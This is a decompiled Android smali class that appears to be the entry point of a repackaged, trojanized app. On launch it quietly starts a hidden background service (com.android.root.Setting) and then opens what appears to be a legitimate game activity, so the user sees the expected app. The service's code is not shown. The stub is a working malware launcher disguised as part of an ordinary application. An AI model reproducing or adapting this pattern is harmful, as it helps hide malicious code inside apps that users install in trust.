.class public Lcom/android/root/main;
.super Landroid/app/Activity;
.source "main.java"


# static fields
.field private static final activity:Ljava/lang/String; = "com.mikeperrow.spiral.SpiralActivity"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 8
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 5
    .parameter "savedInstanceState"

    .prologue
    .line 16
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 22
    new-instance v1, Landroid/content/Intent;

    const-class v4, Lcom/android/root/Setting;

    invoke-direct {v1, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 23
    .local v1, i:Landroid/content/Intent;
    invoke-virtual {p0, v1}, Lcom/android/root/main;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 25
    const/4 v3, 0x0

    .line 27
    .local v3, localObject:Ljava/lang/Class;
    :try_start_0
    const-string v4, "com.mikeperrow.spiral.SpiralActivity"

    invoke-static {v4}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v3

    .line 32
    :goto_0
    if-eqz v3, :cond_0

    .line 33
    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 34
    .local v2, localIntent2:Landroid/content/Intent;
    invoke-virtual {p0, v2}, Lcom/android/root/main;->startActivity(Landroid/content/Intent;)V

    .line 37
    .end local v2           #localIntent2:Landroid/content/Intent;
    :cond_0
    invoke-virtual {p0}, Lcom/android/root/main;->finish()V

    .line 38
    return-void

    .line 28
    :catch_0
    move-exception v4

    move-object v0, v4

    .line 30
    .local v0, e:Ljava/lang/ClassNotFoundException;
    invoke-virtual {v0}, Ljava/lang/ClassNotFoundException;->printStackTrace()V

    goto :goto_0
.end method
